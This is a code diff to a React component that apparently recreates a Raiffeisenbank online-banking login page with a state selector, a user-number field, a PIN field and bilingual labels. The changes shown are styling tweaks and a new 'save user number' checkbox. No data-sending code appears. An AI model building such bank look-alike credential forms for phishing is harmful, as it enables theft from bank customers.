@@ -1,5 +1,5 @@
 import { useState, useRef, useEffect } from "react";
-import { ExternalLink, ChevronDown, Check } from "lucide-react";
+import { ExternalLink, ChevronDown, Check, Info } from "lucide-react";
 import bgImage from "@/assets/rbg_wald.jpg";
 
 const bundeslaender = [
@@ -26,6 +26,7 @@ const translations = {
     pinLabel: "PIN eingeben",
     weiter: "Weiter",
     pflichtfeld: "Pflichtfeld",
+    verfuegerSpeichern: "Verfüger speichern",
     impressum: "Impressum",
     nutzungsbedingungen: "Nutzungsbedingungen",
     barrierefreiheit: "Barrierefreiheitserklärung",
@@ -40,6 +41,7 @@ const translations = {
     pinLabel: "Enter PIN",
     weiter: "Continue",
     pflichtfeld: "Required field",
+    verfuegerSpeichern: "Save user number",
     impressum: "Legal Notice",
     nutzungsbedingungen: "Terms of Use",
     barrierefreiheit: "Accessibility Statement",
@@ -91,7 +93,7 @@ const Raiffeisenbank = () => {
       }}
     >
       {/* Login Card */}
-      <div className="relative z-10 w-full max-w-xl rounded-md bg-white p-8 shadow-lg">
+      <div className="relative z-10 w-full max-w-2xl rounded-sm bg-white p-10 shadow-lg">
         {/* Language Switcher */}
         <div className="absolute right-4 top-4" ref={langRef}>
           <button
@@ -99,7 +101,7 @@ const Raiffeisenbank = () => {
             className={`flex items-center justify-between px-4 py-2 text-base text-gray-700 min-w-[160px] border ${langOpen ? "border-gray-300 bg-white rounded-t-md rounded-b-none" : "border-transparent bg-transparent rounded-md"}`}
           >
             {lang === "de" ? t.deutsch : t.englisch}
-            <ChevronDown className={`h-5 w-5 transition-transform duration-200 ${langOpen ? "rotate-180" : ""}`} />
+            <ChevronDown className={`h-7 w-7 transition-transform duration-200 ${langOpen ? "rotate-180" : ""}`} strokeWidth={2.5} />
           </button>
           {langOpen && (
             <div className="absolute right-0 top-full min-w-full rounded-b-md border border-gray-300 border-t-0 bg-white shadow-lg z-50">
@@ -121,15 +123,15 @@ const Raiffeisenbank = () => {
           )}
         </div>
 
-        <h1 className="mb-4 text-2xl font-light text-[#1a1a1a]">
+        <h1 className="mb-4 text-3xl font-light text-[#1a1a1a]">
           {t.title}
         </h1>
-        <p className="mb-6 text-sm text-gray-500">
+        <p className="mb-8 text-base text-gray-500">
           {t.subtitle}
         </p>
 
         {/* Bundesland Custom Dropdown */}
-        <div className="relative mb-4" ref={dropdownRef}>
+        <div className="relative mb-6" ref={dropdownRef}>
           <label
             className={`pointer-events-none absolute left-3 z-10 transition-all duration-200 ${
               selectLabelFloated
@@ -142,7 +144,7 @@ const Raiffeisenbank = () => {
           <div
             onClick={() => setSelectOpen(!selectOpen)}
             onBlur={() => setBundeslandTouched(true)}
-            className={`w-full cursor-pointer border-b-2 px-3 pb-1 pt-5 text-sm text-[#1a1a1a] outline-none ${
+            className={`w-full cursor-pointer border-b-2 px-3 pb-2 pt-6 text-base text-[#1a1a1a] outline-none ${
               selectOpen ? "border-[#fbf315] bg-[#e8e8e8]" : bundeslandTouched && !bundesland ? "border-red-600 bg-[#f4f4f4]" : "border-[#1a1a1a] bg-[#f4f4f4]"
             }`}
           >
@@ -194,14 +196,14 @@ const Raiffeisenbank = () => {
         </div>
 
         {/* Verfügernummer */}
-        <div className="relative mb-4">
+        <div className="relative mb-6">
           <input
             type="text"
             value={verfueger}
             onChange={(e) => setVerfueger(e.target.value)}
             onBlur={() => setVerfuegerTouched(true)}
             placeholder=" "
-            className={`peer w-full border-b-2 bg-[#f4f4f4] px-3 pb-1 pt-5 text-sm text-[#1a1a1a] outline-none focus:border-[#fbf315] focus:bg-[#e8e8e8] ${
+            className={`peer w-full border-b-2 bg-[#f4f4f4] px-3 pb-2 pt-6 text-base text-[#1a1a1a] outline-none focus:border-[#fbf315] focus:bg-[#e8e8e8] ${
               verfuegerTouched && !verfueger ? "border-red-600" : "border-[#1a1a1a]"
             }`}
           />
@@ -219,7 +221,7 @@ const Raiffeisenbank = () => {
         </div>
 
         {/* PIN */}
-        <div className="relative mb-6">
+        <div className="relative mb-8">
           <input
             type="password"
             maxLength={5}
@@ -227,7 +229,7 @@ const Raiffeisenbank = () => {
             onChange={(e) => setPin(e.target.value)}
             onBlur={() => setPinTouched(true)}
             placeholder=" "
-            className={`peer w-full border-b-2 bg-[#f4f4f4] px-3 pb-1 pt-5 text-sm text-[#1a1a1a] outline-none focus:border-[#fbf315] focus:bg-[#e8e8e8] ${
+            className={`peer w-full border-b-2 bg-[#f4f4f4] px-3 pb-2 pt-6 text-base text-[#1a1a1a] outline-none focus:border-[#fbf315] focus:bg-[#e8e8e8] ${
               pinTouched && !pin ? "border-red-600" : "border-[#1a1a1a]"
             }`}
           />
@@ -242,6 +244,19 @@ const Raiffeisenbank = () => {
               {t.pflichtfeld}
             </div>
           )}
+        </div>
+
+        {/* Verfüger speichern Checkbox */}
+        <div className="mb-8 flex items-center gap-2">
+          <input
+            type="checkbox"
+            id="save-verfueger"
+            className="h-5 w-5 cursor-pointer accent-[#1a1a1a]"
+          />
+          <label htmlFor="save-verfueger" className="cursor-pointer text-base text-[#1a1a1a]">
+            {t.verfuegerSpeichern}
+          </label>
+          <Info className="h-5 w-5 cursor-pointer text-gray-400" />
         </div>
 
         {/* Weiter Button */}
